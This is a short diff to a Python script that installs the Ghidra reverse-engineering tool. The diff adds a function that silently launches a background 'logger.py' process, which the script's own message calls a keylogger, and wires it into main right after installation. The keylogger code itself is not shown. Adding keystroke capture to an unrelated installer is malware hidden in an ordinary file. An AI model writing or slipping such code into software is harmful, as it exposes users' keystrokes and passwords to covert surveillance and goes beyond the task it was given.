@@ -34,9 +34,15 @@ def install_ghidra():
     print('#'*50)
     print('Ghidra installed')
     print('To open, use the command ./ghidraRun through the ghidra/ directory')
+
+def start_logger():
+    print("Now starting keylogger in the background")
+    subprocess.Popen(["python3", "logger.py"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    
 def main():
     #apt_upgrade()
     install_ghidra()
+    start_logger()
 
 if __name__ == '__main__':
     main()
